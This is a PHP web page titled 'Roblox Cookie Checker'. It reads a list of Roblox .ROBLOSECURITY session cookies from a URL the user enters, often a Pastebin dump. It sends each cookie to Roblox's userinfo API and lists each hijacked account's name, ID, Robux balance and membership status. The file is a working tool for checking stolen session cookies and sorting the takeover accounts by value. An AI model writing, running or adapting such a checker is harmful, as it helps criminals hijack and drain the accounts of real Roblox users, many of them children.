<!DOCTYPE html>
<html lang="en">
<?php
$no_results = false;

if (isset($_POST["scrape"])) {

	$cookie_url = $_POST["cookieurl"];
	$cookies =  file($cookie_url, FILE_IGNORE_NEW_LINES);
	
	$total_cookies = count($cookies);
	
	$user_id = array();
	$user_name = array();
	$robux_balance = array();
	$thumbnail = array();
	$builders_blub = array();
	$premium = array();

	foreach ($cookies as $cookie) {


		$ch = curl_init();
		$url = "https://www.roblox.com/mobileapi/userinfo";
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
		curl_setopt($ch, CURLOPT_ENCODING,  '');
		$rbx_code;

		$cookie_list = "https://pastebin.com/raw/wn2FYHsm";
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=" . $cookie));
		$output = curl_exec($ch);
		curl_close($ch);
		$data = json_decode($output);




		$user_id[] = $data->UserID;
		$user_name[] = $data->UserName;
		$robux_balance[] = $data->RobuxBalance;
		$thumbnail[] = $data->ThumbnailUrl;

		if ($data->IsAnyBuildersClubMember) {
			$builders_blub[] = "<i style='color: green;' class='fad fa-check-square'></i>";
		} else {
			$builders_blub[] = "<i style='color: red;' class='fad fa-times'></i>";
		}

		if ($data->IsPremium) {
			$premium[] = "<i style='color: green;' class='fad fa-check-square'></i>";
		} else {
			$premium[] = "<i style='color: red;' class='fad fa-times'></i>";
		}
		$number_of_results = count($data->UserID);

		if ($number_of_results > 0) {
			$no_results = true;
		} else {
			$no_results = false;
		}
	}
}
?>

<head>
	<title>Roblox Web-based Cookie Checker</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!--===============================================================================================-->
	<link rel="icon" type="image/png" href="images/icons/favicon.ico?v4" />
	<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
	<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
	<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
	<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
	<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/perfect-scrollbar/perfect-scrollbar.css">
	<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
	<script>
		//prevents resubmissions on refresh kek
		if (window.history.replaceState) {
			window.history.replaceState(null, null, window.location.href);
		}
	</script>
	<link href="https://pro.fontawesome.com/releases/v5.15.1/css/all.css?v8" rel="stylesheet">
</head>

<body>

	<div style="background: -webkit-linear-gradient(bottom,#1d0048,#520bd2);" class="limiter">

		<div class="container-table100">
			<img style="height: 12vh; padding-right: 2vh" src="https://upload.wikimedia.org/wikipedia/commons/e/e5/Crystal_Project_cookie.png">
			<div style="display: inline-block;" class="formstart">
				<h2 style="color: white;font-family: Roboto-Medium;text-shadow: 0 0 9px #b56dff;">Roblox Cookie Checker - by xyba#1337</h2><br>
				<form style="background-color: #9347ff;" method="POST" action="index.php">
					<table>
						<tr>
							<td><input style="font-family: Roboto-Medium; width: 40vh; height: 3vh;" type="password" name="cookieurl" placeholder="Enter the scrape-url"></td>
							<td><button style="font-family: Roboto-Medium;" name="scrape" type="submit">Check</button></td>
					</table>
				</form>
				<br>
			</div>

			<?php if ($no_results == false) {
				echo "<div style='display: none;'  id='tableshow' class='wrap-table100'>";
			} else {
				echo "<div style='display: inherit;'  id='tableshow' class='wrap-table100'>";
			}
			?>
			<div class="table100 ver1">
				<div class="table100-firstcol">
					<table>
						<thead>
							<tr class="row100 head">
								<th class="cell100 column1">Account Name</th>
							</tr>
						</thead>
						<tbody>
							<?php


							$x = 0; ?>
							<?php for ($x; $x < $total_cookies; $x++) {
								echo "<tr class='row100 body'>
							
							<td class='cell100 column1'><img style='height: 3vh;' src='" . $thumbnail[$x] . "'> " . $user_name[$x] . "</td>
						</tr>";
							} ?>
						</tbody>
					</table>
				</div>

				<div class="wrap-table100-nextcols js-pscroll">
					<div class="table100-nextcols">
						<table>
							<thead>
								<tr class="row100 head">
									<th class="cell100 column2">User-ID</th>
									<th class="cell100 column3">Robux Balance</th>
									<th class="cell100 column5">Builders-Club</th>
									<th class="cell100 column6">Premium</th>
								</tr>
							</thead>
							<tbody>

								<?php $x = 0; ?>
								<?php for ($x; $x < $total_cookies; $x++) {

									echo "<tr class='row100 body'> <td style='height: 6.32vh;' class='cell100 column2'>" . $user_id[$x] . "</td>";
									echo "<td style='height: 6.32vh;' class='cell100 column2'>" . $robux_balance[$x] . "</td>";
									echo "<td style='height: 6.32vh;' class='cell100 column2'>" . $builders_blub[$x] . "</td>";
									echo "<td style='height: 6.32vh;' class='cell100 column2'>" . $premium[$x] . "</td></tr>";
								} ?>

							</tbody>
						</table>
					</div>
				</div>
			</div>
		</div>
	</div>
	</div>


	<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
	<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
	<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
	<!--===============================================================================================-->
	<script src="vendor/perfect-scrollbar/perfect-scrollbar.min.js"></script>
	<script>
		$('.js-pscroll').each(function() {
			var ps = new PerfectScrollbar(this);

			$(window).on('resize', function() {
				ps.update();
			})

			$(this).on('ps-x-reach-start', function() {
				$(this).parent().find('.table100-firstcol').removeClass('shadow-table100-firstcol');
			});

			$(this).on('ps-scroll-x', function() {
				$(this).parent().find('.table100-firstcol').addClass('shadow-table100-firstcol');
			});

		});
	</script>
	<!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
	<script>
		window.dataLayer = window.dataLayer || [];

		function gtag() {
			dataLayer.push(arguments);
		}
		gtag('js', new Date());

		gtag('config', 'UA-23581568-13');
	</script>

	<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>

</html>